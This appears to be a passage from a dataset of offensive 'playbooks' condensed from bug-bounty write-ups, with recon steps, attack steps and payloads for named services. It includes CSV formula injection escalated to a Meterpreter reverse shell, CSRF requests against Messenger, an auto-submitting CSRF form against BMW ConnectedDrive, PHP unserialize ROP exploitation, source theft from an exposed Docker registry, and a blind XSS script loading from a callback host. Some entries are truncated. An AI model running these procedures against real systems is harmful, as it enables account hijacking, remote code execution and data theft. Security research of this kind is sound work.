Step 2: Inject the crafted payload into a user-modifiable field (e.g., video title) that is exported in the CSV.
Step 3: Trigger the export of the CSV file containing the injected payload.
Step 4: Download and open the CSV file in a compatible spreadsheet application (e.g., Microsoft Excel).
Step 5: Observe if the embedded payload executes (e.g., calculator launches).
Step 6: If successful, escalate the payload to a more sophisticated one, such as a Meterpreter reverse shell, using a downloadable script.
tools_recommended: Burp Suite: To intercept and modify requests when submitting or exporting data.
A spreadsheet application (e.g., Microsoft Excel): To open the generated CSV and trigger the payload.
A web server or collaboration tool (e.g., Burp Collaborator, Netcat): To receive the reverse shell callback.
success_indicators: The target spreadsheet application launches an external program (e.g., `calc.exe`).
A reverse shell connection is established from the victim's machine to the attacker's controlled server, indicated by a Meterpreter session or command prompt access.
failure_indicators: The CSV file opens without any command execution, or the payload is displayed as plain text within a cell.
The target application rejects the input containing special characters or attempts to sanitize them, resulting in an error or malformed CSV.
No reverse shell callback is received after opening the CSV with the advanced payload. This might indicate network restrictions or a more robust payload execution environment.

playbooks.impact: Remote code execution on the victim's machine, allowing an attacker to gain a Meterpreter session, execute arbitrary commands, steal sensitive data, or pivot to other systems within the victim's network.
playbooks.key_lesson: Always sanitize user-supplied input that will be rendered in exported files like CSV, paying close attention to special characters that can be interpreted as commands or formulas by spreadsheet applications.

meta.title: Messenger.com Site-Wide CSRF

trigger_conditions.when_to_apply: When a web application fails to validate CSRF tokens on authenticated user requests, allowing an attacker to perform actions on behalf of the victim. This is specifically applicable to authenticated endpoints that perform state-changing operations.
prerequisites: Attacker has an authenticated session or can trick a victim into making requests to Messenger.com while authenticated.
applicability_signals: Authenticated endpoints that accept POST requests to modify settings or perform actions.
Endpoints that use `__a=1` parameter.
skip_if: All requests from authenticated users are properly protected by CSRF tokens, indicated by a 403 Forbidden or a redirect to `/common/invalid_request.php` when the CSRF token is missing or malformed.

recon_steps: Step 1: Identify authenticated endpoints that perform state-changing actions (e.g., sending messages, changing settings, managing group membership).
Step 2: Send requests to these endpoints with standard parameters and observe the successful response.
Step 3: Analyze the requests for the presence of a CSRF token parameter (e.g., `fb_dtsg`).
attack_steps: Step 1: Send a POST request to an authenticated endpoint (e.g., `/settings/edit/`) with parameters that modify a setting (e.g., `settings[sound_enabled]=false`) and include `__a=1`.
Step 2: Remove the `fb_dtsg` parameter from the request.
Step 3: Observe the response. If the action is performed and a 200 OK status code is received with JavaScript payload, the endpoint is vulnerable.
Step 4: Repeat for other state-changing endpoints (e.g., `/chat/remove_participants/`) to confirm site-wide applicability.
payloads_or_patterns:
POST /settings/edit/ HTTP/1.1
Host: www.messenger.com
Content-Type: application/x-www-form-urlencoded
Cookie: <SESSION_TOKEN>

settings[sound_enabled]=false&__a=1

POST /chat/remove_participants/?uid=<TARGET_USER_ID>&tid=<THREAD_ID> HTTP/1.1
Host: www.messenger.com
Content-Type: application/x-www-form-urlencoded
Cookie: <SESSION_TOKEN>

__a=1
tools_recommended: Burp Suite: To intercept, modify, and replay HTTP requests.
Browser Developer Tools: To identify network requests and analyze responses.
success_indicators: HTTP/1.1 200 OK status code for requests where the CSRF token was removed.
Response contains a JavaScript payload starting with `for (;;);` indicating the action was processed.
Observable change in the application state (e.g., sound setting is disabled, user is removed from a group).
failure_indicators: Receiving a 403 Forbidden or a redirect to `/common/invalid_request.php` when the `fb_dtsg` parameter is removed. This indicates the CSRF protection is effective for that endpoint.
Action does not reflect in the application state despite a 200 OK response. This might indicate a partial implementation or a different type of check.

playbooks.impact: An attacker can perform any action on Messenger.com that the victim user is authorized to perform, such as sending messages, deleting messages, removing users from group chats, changing user settings, and potentially more, all without the user's explicit consent. This can lead to unauthorized communication, data manipulation, and social engineering attacks.
playbooks.key_lesson: Always implement and verify CSRF protection mechanisms, especially on state-changing authenticated endpoints. Ensure CSRF tokens are validated on every request and not bypassed by specific parameters like `__a=1`.

meta.title: BMW Vulnerabilities – Hijack Cars ConnectedDrive™ Service!

trigger_conditions.when_to_apply: When the target application fails to implement X-Frame-Options headers or frame-busting techniques, and allows state-changing POST requests without CSRF tokens.
prerequisites: Attacker has a working understanding of Clickjacking and CSRF attack vectors.
Target application is accessible and allows user authentication.
applicability_signals: Web application pages can be loaded within an iframe.
Sensitive actions are performed via POST requests that do not include anti-CSRF tokens.
skip_if: Target application implements X-Frame-Options: DENY or SAMEORIGIN.
Target application employs robust frame-busting JavaScript.
State-changing POST requests are protected by valid CSRF tokens.

recon_steps: Step 1: Access https://connecteddrive.bmwusa.com/cdp/release/internet/servlet/customerData in a browser and observe HTTP response headers for 'X-Frame-Options'.
Step 2: Attempt to load the same URL within an iframe in a custom HTML page to verify Clickjacking susceptibility.
Step 3: Analyze POST requests to sensitive endpoints like 'customerData' to check for the presence of CSRF tokens.
attack_steps: Step 1: For Clickjacking: Create an HTML page with an iframe pointing to a sensitive BMW ConnectedDrive page (e.g., account settings, car control). Overlay transparent divs to trick the user into clicking unintended elements.

Step 2: For CSRF: Craft an HTML form that automatically submits a POST request to a state-changing endpoint (e.g., changing user details, performing an action) with malicious parameters, assuming the user is already authenticated.
Step 3: Socially engineer the victim to visit the attacker-controlled HTML page to trigger the Clickjacking or CSRF attack.
payloads_or_patterns: CSRF PoC Form: `<html><form action="https://connecteddrive.bmwusa.com/cdp/release/internet/servlet/customerData" method="POST"><input type="hidden" name="action" value="changeUsername" /><input type="hidden" name="greeting" value="MR" /><input type="hidden" name="firstname" value="Hijacked" /><input type="hidden" name="lastname" value="Car" /><input type="hidden" name="firstname1" value="Hijacked" /><input type="hidden" name="lastname1" value="Car" /></form><script>document.forms[0].submit();</script></html>`
tools_recommended: Burp Suite: To intercept and analyze HTTP requests/responses, identify sensitive endpoints and parameters.
Custom HTML/JavaScript: To craft and host exploit pages for Clickjacking and CSRF.
success_indicators: For Clickjacking: User unintentionally performs actions on the BMW ConnectedDrive site (e.g., changes profile settings, initiates a command) when interacting with the attacker's page.
For CSRF: User's profile information is modified, or an unintended action is executed on their BMW ConnectedDrive account without their explicit consent.
failure_indicators: Clickjacking: The BMW ConnectedDrive page is not displayed within an iframe, or an 'X-Frame-Options' violation is shown in the browser console. Pivot: Focus on CSRF if frameability is blocked.
CSRF: The POST request fails with a 403 Forbidden error, or a valid CSRF token is required. Pivot: Investigate other vulnerabilities if CSRF protection is robust.

playbooks.impact: Attacker can hijack user accounts, change credentials, perform unauthorized actions on behalf of the user within the BMW ConnectedDrive service, potentially leading to control of connected vehicle features.
playbooks.key_lesson: Always implement X-Frame-Options headers (DENY or SAMEORIGIN) and use anti-CSRF tokens for all state-changing requests to prevent Clickjacking and CSRF attacks.

meta.title: How we broke PHP, hacked Pornhub and earned $20,000

tech_stack_fingerprints: uses PHP's unserialize function on user input

trigger_conditions.when_to_apply: When a web application deserializes user-controlled input without proper validation, particularly when the `cookie` parameter is involved.
prerequisites: User is authenticated.

The target application uses PHP version susceptible to unserialize vulnerabilities (though the writeup mentions PHP 5.6 and 7 were targeted, specific version details for the exploit are implied to be older or specific to the garbage collection).
The `cookie` parameter in POST data is processed by `unserialize()`.
applicability_signals: POST request to endpoints like `/album_upload/create` or `/uploading/photo`.
Presence of a `cookie` parameter in the POST data.
Response headers include `Set-Cookie` populated with values derived from the `cookie` parameter.
The application reflects unserialized data or exceptions related to unserialization in the response.
skip_if: No `cookie` parameter is found in POST requests to the identified endpoints.
The `unserialize()` function is not used on user-controlled input for the `cookie` parameter.
Input validation or sanitization effectively prevents malicious object creation during deserialization.

recon_steps: Step 1: Identify endpoints that accept file uploads or album creation via POST requests.
Step 2: Inspect POST requests for parameters that might be processed by `unserialize()` (e.g., `cookie`, `data`, `settings`).

Step 3: Send crafted serialized data (e.g., simple arrays, objects) in the `cookie` parameter and observe the application's response, particularly `Set-Cookie` headers and any reflected error messages or stack traces.
attack_steps: Step 1: Send a POST request to a vulnerable endpoint (e.g., `/album_upload/create`) with a crafted `cookie` parameter containing a serialized object that abuses PHP's garbage collection or a known POP chain.

Step 2: Analyze the application's response for signs of memory corruption or execution flow manipulation. This often involves observing crashes, unexpected behavior in `Set-Cookie` headers, or reflected information disclosures.
Step 3: If initial attempts do not yield direct RCE, proceed with memory disclosure techniques to leak addresses of the PHP binary and required ROP gadgets.
Step 4: Craft a Return-Oriented Programming (ROP) payload targeting specific gadgets within the leaked binary segments.
Step 5: Return into the crafted ROP chain to achieve arbitrary code execution.
payloads_or_patterns: Full exploit requires advanced ROP chains and memory disclosure techniques specific to the target PHP version and environment.
tools_recommended: Burp Suite: To intercept and modify HTTP requests and responses, particularly POST data and headers.
PHP-GTK (or similar PHP object serialization tools): To craft complex serialized PHP objects for fuzzing and exploitation.
GDB/PEDA/GEF: For debugging PHP processes and analyzing memory dumps during exploitation.
Custom scripts (Python/PHP): To automate fuzzing, ROP chain generation, and exploit delivery.
success_indicators: Remote code execution confirmed (e.g., via shell access, command execution, or arbitrary file writes).
Observable memory corruption leading to application crash or unexpected behavior.
Successful leakage of memory addresses or sensitive binary segments.
Successful execution of ROP chain leading to control over the instruction pointer.
failure_indicators: No `Set-Cookie` header is returned or it doesn't reflect the serialized data.
Application returns a generic error or a sanitized response without any indication of deserialization issues.
No signs of memory corruption or crashes after sending crafted payloads.
WAF blocks the request or response containing serialized objects.

playbooks.impact: Gain Remote Code Execution (RCE) on the target server, allowing for full system compromise, data exfiltration, or further malicious activities.
playbooks.key_lesson: Always treat data passed to PHP's `unserialize()` function as untrusted. Implement strict validation or avoid deserializing user-controlled input entirely to prevent memory corruption and RCE vulnerabilities, especially when dealing with object structures.

meta.title: Twitter's Vine Source code dump - $10080

trigger_conditions.when_to_apply: When a publicly accessible Docker registry is found that hosts images for a target application and the registry is not using the latest version (V2) or has misconfigured access controls.
prerequisites: Discovery of a publicly accessible Docker registry endpoint for the target organization.
applicability_signals: Response from a Docker registry endpoint containing '/* private docker registry */' indicating it is publicly accessible.
Existence of application-related images within the Docker registry (e.g., 'vinewww').

The Docker registry requires authentication and no credentials can be obtained.

Step 2: Analyze Censys.io results for potentially interesting URLs. Specifically look for URLs that might indicate a Docker registry, such as 'docker.<target_domain>.com'.
Step 3: Access the discovered Docker registry URL via a browser to observe its response. Look for indicators of it being a Docker registry, even if it claims to be private.
attack_steps: Step 1: Query the Docker registry's search API endpoint (using V1 documentation if necessary) to enumerate available images.
Step 2: Identify and prioritize images that are likely to contain application source code (e.g., named 'vinewww').
Step 3: Use the Docker client to pull the identified image (e.g., `sudo docker pull <docker_registry_url>/library/<image_name>`).
Step 4: Run the downloaded Docker image with an interactive shell (e.g., `docker run -it <image_name> /bin/bash`).
Step 5: Navigate within the container and examine the file system for source code and sensitive files.
tools_recommended: Subbrute: for subdomain enumeration
Virustotal.com, Dnsdumster.com, Dnsdb.org, Censys.io: for subdomain and infrastructure discovery
Docker client: to pull and run Docker images
Browser: to initially probe endpoints
success_indicators: Discovery of application source code, API keys, or third-party secrets within the Docker image's file system.
Ability to run the image and host a local replica of the target application.
failure_indicators: No application-related images found in the registry.
Images found are obfuscated or encrypted, preventing easy analysis.
Docker registry requires authentication that cannot be bypassed or obtained.
Response 404 or other errors when querying the search API.

playbooks.impact: Full disclosure of the target application's source code, including potential API keys, third-party secrets, and business logic, leading to further vulnerabilities and competitive disadvantage.
playbooks.key_lesson: Always investigate publicly exposed Docker registries for sensitive information or application source code, as misconfigurations can lead to significant data leaks.

meta.title: Blind XSS in Spotify's Salesforce Integration

trigger_conditions.when_to_apply: When a web application integrates with Salesforce for customer support and allows user-submitted data to be displayed in privileged backend views without proper sanitization.
prerequisites: Attacker can submit data through a user-facing form that is later displayed in a Salesforce backend view.
applicability_signals: Presence of a user contact/feedback form.
Observations of Salesforce domains being used for support functionalities.
skip_if: All user input is heavily sanitized and reflects back immediately without any observable impact.
No obvious integration points with external services like Salesforce are detected.

recon_steps: Step 1: Identify user-facing forms that submit data to the company's support system.
Step 2: Observe network traffic or analyze source code to identify backend systems or domains used for support (e.g., Salesforce).
attack_steps: Step 1: Register an account on XSS Hunter or a similar service to obtain a unique callback URL.
Step 2: Submit a payload via the identified user-facing form, including the XSS Hunter callback URL. Example payload: <script src=https://<your_xss_hunter_subdomain>.xss.ht></script>
Step 3: Monitor the XSS Hunter dashboard for incoming callbacks, which indicate the payload has been executed in the backend.
tools_recommended: XSS Hunter: To host the payload and receive callbacks.
Browser Developer Tools: To identify input fields and observe network requests.

Seeing an incoming request from the target domain to the XSS Hunter callback URL.

Possible reasons include: input sanitization, client-side filtering, or the payload is not being rendered in a context that executes JavaScript. Pivot: Try different XSS payloads, encode characters, or look for other input vectors.
